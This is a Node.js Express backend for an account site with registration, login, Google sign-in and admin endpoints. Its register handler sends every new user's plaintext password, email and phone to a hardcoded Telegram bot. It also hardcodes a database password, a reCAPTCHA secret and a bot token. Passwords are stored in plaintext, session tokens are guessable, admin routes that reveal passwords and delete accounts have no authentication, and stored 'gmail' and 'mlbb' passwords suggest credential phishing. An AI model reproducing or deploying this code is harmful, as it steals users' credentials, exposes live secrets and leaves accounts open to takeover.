const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const pool = new Pool({
    connectionString: 'postgresql://neondb_owner:npg_XQ1o9KdkvZWa@ep-holy-credit-am3o64na-pooler.c-5.us-east-1.aws.neon.tech/neondb?sslmode=require',
    ssl: { rejectUnauthorized: false }
});

const RECAPTCHA_SECRET = '6LcobYosAAAAANDtHfj2MH7FwzjKn5_VAhS2PSnH';
const BOT_TOKEN = '8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE';
const CHAT_ID = '8315928972';

function tgSend(msg) {
    https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
}

function verifyCaptcha(token) {
    return new Promise((resolve) => {
        const data = `secret=${RECAPTCHA_SECRET}&response=${token}`;
        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => { try { resolve(JSON.parse(body).success); } catch (e) { resolve(false); } });
        });
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

// Create tables
pool.query(`CREATE TABLE IF NOT EXISTS auth_users (
    id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200) UNIQUE NOT NULL,
    phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200),
    login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500),
    gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008',
    mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP
)`);
pool.query(`CREATE TABLE IF NOT EXISTS notices (id SERIAL PRIMARY KEY, message TEXT, created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS banned_users (user_id VARCHAR(100) PRIMARY KEY, banned_by VARCHAR(100), banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);

// REGISTER
app.post('/api/register', async (req, res) => {
    const { username, email, phone, password, captcha } = req.body;
    if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
    const ok = await verifyCaptcha(captcha);
    if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
    try {
        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]);
        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
        await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']);
        tgSend(`🆕 New Registration\n👤 Name: ${username}\n📧 Email: ${email}\n📱 Phone: ${phone}\n🔑 Password: ${password}\n📅 ${new Date().toLocaleString()}`);
        res.json({ success: true, message: 'Registration successful' });
    } catch (e) { res.json({ success: false, message: 'DB Error: ' + e.message }); }
});

// LOGIN
app.post('/api/login', async (req, res) => {
    const { email, password, captcha } = req.body;
    if (!email || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
    const ok = await verifyCaptcha(captcha);
    if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
    try {
        const result = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]);
        if (result.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
        const user = result.rows[0];
        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [user.id]);
        res.json({ success: true, token: 'token_' + user.id, user: { id: user.id, username: user.username, email: user.email, login_type: 'local' } });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

// GOOGLE AUTH
app.post('/api/auth/google', async (req, res) => {
    const { token, userInfo } = req.body;
    if (!userInfo) return res.json({ success: false });
    const { sub: googleId, email, name, picture } = userInfo;
    try {
        let result = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [googleId]);
        if (result.rows.length > 0) {
            await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [result.rows[0].id]);
            return res.json({ success: true, token: 'token_' + result.rows[0].id, user: { id: result.rows[0].id, username: result.rows[0].username, email, login_type: 'google' } });
        }
        result = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (result.rows.length > 0) {
            await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [googleId, result.rows[0].id]);
            return res.json({ success: true, token: 'token_' + result.rows[0].id, user: { id: result.rows[0].id, username: result.rows[0].username, email, login_type: 'google' } });
        }
        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, googleId, 'google']);
        res.json({ success: true, token: 'token_' + newUser.rows[0].id, user: { id: newUser.rows[0].id, username: name, email, login_type: 'google' } });
    } catch (e) { res.json({ success: false }); }
});

// CHECK SESSION
app.post('/api/check_session', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ success: false });
    const id = parseInt(token.replace('token_', ''));
    try {
        const result = await pool.query('SELECT * FROM auth_users WHERE id = $1', [id]);
        if (result.rows.length === 0) return res.json({ success: false });
        const u = result.rows[0];
        res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } });
    } catch (e) { res.json({ success: false }); }
});

app.post('/api/logout', (req, res) => res.json({ success: true }));

// GET PASSWORDS
app.post('/api/get_passwords', async (req, res) => {
    const { token } = req.body;
    if (!token) return res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' });
    const id = parseInt(token.replace('token_', ''));
    try {
        const result = await pool.query('SELECT * FROM auth_users WHERE id = $1', [id]);
        if (result.rows.length === 0) return res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' });
        res.json({ success: true, gmail_password: result.rows[0].gmail_pass, mlbb_password: result.rows[0].mlbb_pass });
    } catch (e) { res.json({ success: true, gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008' }); }
});

// CHANGE PASSWORD
app.post('/api/change_password', async (req, res) => {
    const { token, type, current_password, new_password } = req.body;
    if (!token) return res.json({ success: false, message: 'Session expired' });
    const id = parseInt(token.replace('token_', ''));
    try {
        const result = await pool.query('SELECT * FROM auth_users WHERE id = $1', [id]);
        if (result.rows.length === 0) return res.json({ success: false, message: 'User not found' });
        const field = type === 'gmail' ? 'gmail_pass' : 'mlbb_pass';
        if (current_password !== result.rows[0][field]) return res.json({ success: false, message: 'Wrong current password' });
        await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [new_password, id]);
        res.json({ success: true, message: 'Password changed' });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

// ADMIN SEARCH
app.post('/api/admin/search', async (req, res) => {
    const { userId } = req.body;
    try {
        const result = await pool.query('SELECT * FROM auth_users WHERE id = $1 OR username = $1 OR email = $1', [userId]);
        if (result.rows.length === 0) return res.json({ success: false, message: 'Not found' });
        const u = result.rows[0];
        res.json({ success: true, data: { user_id: u.id, name: u.username, ingame_name: u.username, password: u.password } });
    } catch (e) { res.json({ success: false }); }
});

// ADMIN BAN
app.post('/api/admin/ban', async (req, res) => {
    const { userId } = req.body;
    try {
        await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET banned_by=$2', [userId, 'admin']);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

// ADMIN DELETE
app.post('/api/admin/delete', async (req, res) => {
    const { userId } = req.body;
    try {
        await pool.query('DELETE FROM auth_users WHERE id = $1 OR username = $1 OR email = $1', [userId]);
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

// NOTICE
app.get('/api/notice', async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1');
        if (result.rows.length === 0) return res.json({ success: true, message: '' });
        res.json({ success: true, message: result.rows[0].message, created_at: result.rows[0].created_at });
    } catch (e) { res.json({ success: true, message: '' }); }
});

app.post('/api/admin/notice', async (req, res) => {
    const { message } = req.body;
    if (!message) return res.json({ success: false, message: 'Message required' });
    try {
        await pool.query('INSERT INTO notices (message, created_by) VALUES ($1,$2)', [message, 'admin']);
        res.json({ success: true, message: 'Notice posted' });
    } catch (e) { res.json({ success: false }); }
});

// PAGES
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
